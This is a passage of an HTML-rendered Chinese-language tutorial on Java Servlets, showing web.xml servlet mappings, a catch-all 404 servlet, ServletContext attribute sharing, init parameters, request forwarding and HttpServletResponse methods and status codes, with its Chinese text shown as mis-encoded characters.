class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello2<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello3<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello4<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello5<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸€ä¸ªServletå¯ä»¥æŒ‡å®šé€šç”¨æ˜ å°„è·¯å¾„ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>é»˜è®¤è¯·æ±‚è·¯å¾„ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--é»˜è®¤è¯·æ±‚è·¯å¾„--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æŒ‡å®šä¸€äº›åç¼€æˆ–è€…å‰ç¼€ç­‰ç­‰â€¦.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¯ä»¥è‡ªå®šä¹‰åç¼€å®ç°è¯·æ±‚æ˜ å°„</span></span><br><span class="line"><span class="comment">     æ³¨æ„ç‚¹ï¼Œ*å‰é¢ä¸èƒ½åŠ é¡¹ç›®æ˜ å°„çš„è·¯å¾„</span></span><br><span class="line"><span class="comment">     hello/subei.github</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.github<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¼˜å…ˆçº§é—®é¢˜ã€‚</p>
<ul>
<li>æŒ‡å®šäº†å›ºæœ‰çš„æ˜ å°„è·¯å¾„ä¼˜å…ˆçº§æœ€é«˜ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šèµ°é»˜è®¤çš„å¤„ç†è¯·æ±‚ï¼›</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorServelt</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        writer.println(<span class="string">&quot;&lt;h1&gt;404&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  404  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>error<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ErrorServelt<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>error<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="4-ServletContext"><a href="#4-ServletContext" class="headerlink" title="4.ServletContext"></a>4.ServletContext</h3><ul>
<li>webå®¹å™¨åœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œå®ƒä¼šä¸ºæ¯ä¸ªwebç¨‹åºéƒ½åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ServletContextå¯¹è±¡ï¼Œå®ƒä»£è¡¨äº†å½“å‰çš„webåº”ç”¨ï¼›</li>
</ul>
<h4 id="1-å…±äº«æ•°æ®"><a href="#1-å…±äº«æ•°æ®" class="headerlink" title="1.å…±äº«æ•°æ®"></a>1.å…±äº«æ•°æ®</h4><ul>
<li>åœ¨è¿™ä¸ªServletä¸­ä¿å­˜çš„æ•°æ®ï¼Œå¯ä»¥åœ¨å¦å¤–ä¸€ä¸ªservletä¸­æ‹¿åˆ°ï¼›</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">//        this.getInitParameter(); åˆå§‹åŒ–å‚æ•°</span></span><br><span class="line"><span class="comment">//        this.getServletConfig(); Servleté…ç½®</span></span><br><span class="line"><span class="comment">//        this.getServletContext(); Servletä¸Šä¸‹æ–‡</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;å­¦ä¹ è¶…å¥½&quot;</span>;   <span class="comment">// æ•°æ®</span></span><br><span class="line">        <span class="comment">// å°†ä¸€ä¸ªæ•°æ®ä¿å­˜åœ¨äº†ServletContextä¸­ï¼Œåå­—ä¸ºï¼šname ,å€¼ name</span></span><br><span class="line">        context.setAttribute(<span class="string">&quot;name&quot;</span>,name);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)context.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;åå­—:&quot;</span>+name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>getc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.GetServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>getc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/getc<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-è·å–åˆå§‹åŒ–å‚æ•°"><a href="#2-è·å–åˆå§‹åŒ–å‚æ•°" class="headerlink" title="2.è·å–åˆå§‹åŒ–å‚æ•°"></a>2.è·å–åˆå§‹åŒ–å‚æ•°</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- é…ç½®ä¸€äº›Webåº”ç”¨åˆå§‹åŒ–å‚æ•° --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>url<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jdbc:mysql://localhost:3306/mybatis<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ServletDemo03<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/gp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo03</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> context.getInitParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        resp.getWriter().print(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-è¯·æ±‚è½¬å‘"><a href="#3-è¯·æ±‚è½¬å‘" class="headerlink" title="3.è¯·æ±‚è½¬å‘"></a>3.è¯·æ±‚è½¬å‘</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo04</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">        System.out.println(<span class="string">&quot;è¿›å…¥ServletDemo04æ–‡ä»¶ï¼&quot;</span>);</span><br><span class="line"><span class="comment">//        è½¬å‘çš„è¯·æ±‚è·¯å¾„</span></span><br><span class="line"><span class="comment">//        RequestDispatcher requestDispatcher = context.getRequestDispatcher(&quot;/gp&quot;);</span></span><br><span class="line"><span class="comment">//        è°ƒç”¨forwardå®ç°è¯·æ±‚è½¬å‘;</span></span><br><span class="line"><span class="comment">//        requestDispatcher.forward(req,resp);</span></span><br><span class="line">        context.getRequestDispatcher(<span class="string">&quot;/gp&quot;</span>).forward(req,resp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp02<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ServletDemo04<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>gp02<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/gp02<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="4-è¯»å–èµ„æºæ–‡ä»¶"><a href="#4-è¯»å–èµ„æºæ–‡ä»¶" class="headerlink" title="4.è¯»å–èµ„æºæ–‡ä»¶"></a>4.è¯»å–èµ„æºæ–‡ä»¶</h4><ul>
<li>Properties<ul>
<li>åœ¨javaç›®å½•ä¸‹æ–°å»ºproperties</li>
<li>åœ¨resourcesç›®å½•ä¸‹æ–°å»ºproperties</li>
</ul>
</li>
</ul>
<h3 id="5-HttpServletResponse"><a href="#5-HttpServletResponse" class="headerlink" title="5.HttpServletResponse"></a>5.HttpServletResponse</h3><ul>
<li>webæœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„httpè¯·æ±‚ï¼Œé’ˆå¯¹è¿™ä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«åˆ›å»ºä¸€ä¸ªä»£è¡¨è¯·æ±‚çš„HttpServletRequestå¯¹è±¡ï¼Œä»£è¡¨å“åº”çš„ä¸€ä¸ªHttpServletResponseï¼›<ul>
<li>å¦‚æœè¦è·å–å®¢æˆ·ç«¯è¯·æ±‚è¿‡æ¥çš„å‚æ•°ï¼šæ‰¾HttpServletRequestï¼›</li>
<li>å¦‚æœè¦ç»™å®¢æˆ·ç«¯å“åº”ä¸€äº›ä¿¡æ¯ï¼šæ‰¾HttpServletResponseã€‚</li>
</ul>
</li>
</ul>
<h4 id="1-ç®€å•åˆ†ç±»"><a href="#1-ç®€å•åˆ†ç±»" class="headerlink" title="1.ç®€å•åˆ†ç±»"></a>1.ç®€å•åˆ†ç±»</h4><ul>
<li>è´Ÿè´£å‘æµè§ˆå™¨å‘é€æ•°æ®çš„æ–¹æ³•ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ServletOutputStream <span class="title function_">getOutputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">PrintWriter <span class="title function_">getWriter</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<ul>
<li>è´Ÿè´£å‘æµè§ˆå™¨å‘é€å“åº”å¤´çš„æ–¹æ³•ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setCharacterEncoding</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setContentLength</span><span class="params">(<span class="type">int</span> var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setContentLengthLong</span><span class="params">(<span class="type">long</span> var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setContentType</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setDateHeader</span><span class="params">(String var1, <span class="type">long</span> var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addDateHeader</span><span class="params">(String var1, <span class="type">long</span> var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setHeader</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addHeader</span><span class="params">(String var1, String var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setIntHeader</span><span class="params">(String var1, <span class="type">int</span> var2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addIntHeader</span><span class="params">(String var1, <span class="type">int</span> var2)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>å“åº”çš„çŠ¶æ€ç ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">SC_CONTINUE</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_SWITCHING_PROTOCOLS</span> <span class="operator">=</span> <span class="number">101</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_OK</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_CREATED</span> <span class="operator">=</span> <span class="number">201</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_ACCEPTED</span> <span class="operator">=</span> <span class="number">202</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NON_AUTHORITATIVE_INFORMATION</span> <span class="operator">=</span> <span class="number">203</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NO_CONTENT</span> <span class="operator">=</span> <span class="number">204</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_RESET_CONTENT</span> <span class="operator">=</span> <span class="number">205</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_PARTIAL_CONTENT</span> <span class="operator">=</span> <span class="number">206</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_MULTIPLE_CHOICES</span> <span class="operator">=</span> <span class="number">300</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_MOVED_PERMANENTLY</span> <span class="operator">=</span> <span class="number">301</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_MOVED_TEMPORARILY</span> <span class="operator">=</span> <span class="number">302</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_FOUND</span> <span class="operator">=</span> <span class="number">302</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_SEE_OTHER</span> <span class="operator">=</span> <span class="number">303</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_MODIFIED</span> <span class="operator">=</span> <span class="number">304</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_USE_PROXY</span> <span class="operator">=</span> <span class="number">305</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_TEMPORARY_REDIRECT</span> <span class="operator">=</span> <span class="number">307</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_BAD_REQUEST</span> <span class="operator">=</span> <span class="number">400</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_UNAUTHORIZED</span> <span class="operator">=</span> <span class="number">401</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_PAYMENT_REQUIRED</span> <span class="operator">=</span> <span class="number">402</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_FORBIDDEN</span> <span class="operator">=</span> <span class="number">403</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_FOUND</span> <span class="operator">=</span> <span class="number">404</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_METHOD_NOT_ALLOWED</span> <span class="operator">=</span> <span class="number">405</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_NOT_ACCEPTABLE</span> <span class="operator">=</span> <span class="number">406</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_PROXY_AUTHENTICATION_REQUIRED</span> <span class="operator">=</span> <span class="number">407</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_REQUEST_TIMEOUT</span> <span class="operator">=</span> <span class="number">408</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_CONFLICT</span> <span class="operator">=</span> <span class="number">409</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_GONE</span> <span class="operator">=</span> <span class="number">410</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">SC_LENGTH_REQUIRED</span> <span class="operator">=</span> <span class="number">411</span>;</span><br><span class="line"><span class="type">int</span> <span 